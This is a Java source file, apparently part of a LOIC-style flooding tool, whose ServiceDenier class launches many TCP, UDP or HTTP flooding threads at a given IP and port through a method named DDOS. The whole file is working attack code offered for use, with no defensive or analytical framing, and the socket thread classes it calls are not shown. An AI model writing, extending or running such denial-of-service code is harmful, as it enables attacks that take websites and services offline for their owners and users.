package genius.mohammad.loic;

public class ServiceDenier {

	public static boolean firing = false;
	
	public static boolean error = false;

	public ServiceDenier() {

	}

	public void DDOS(String ip, int port, int method, int threads, int timeout, String message, int pause) {
		firing = true;
		try {
			switch(method) {
			case 0:
				TCPSocketThread[] socketThreadsTCP = new TCPSocketThread[threads];
				for (int i = 0; i < threads; i++) {
					socketThreadsTCP[i] = new TCPSocketThread(ip, port, timeout, message, pause);
					new Thread(socketThreadsTCP[i]).start();
				}
				break;
			case 1:
				UDPSocketThread[] socketThreadsUDP = new UDPSocketThread[threads];
				for (int i = 0; i < threads; i++) {
					socketThreadsUDP[i] = new UDPSocketThread(ip, port, message, pause);
					new Thread(socketThreadsUDP[i]).start();
				}
				break;
			case 2:
				HTTPSocketThread[] socketThreadsHTTP = new HTTPSocketThread[threads];
				for (int i = 0; i < threads; i++) {
					socketThreadsHTTP[i] = new HTTPSocketThread(ip, timeout, pause);
					new Thread(socketThreadsHTTP[i]).start();
				}
				break;
			}
		} catch (Error e) {
			error = true;
			e.printStackTrace();
		}
	}

	public void stop() {
		firing = false;
	}

}
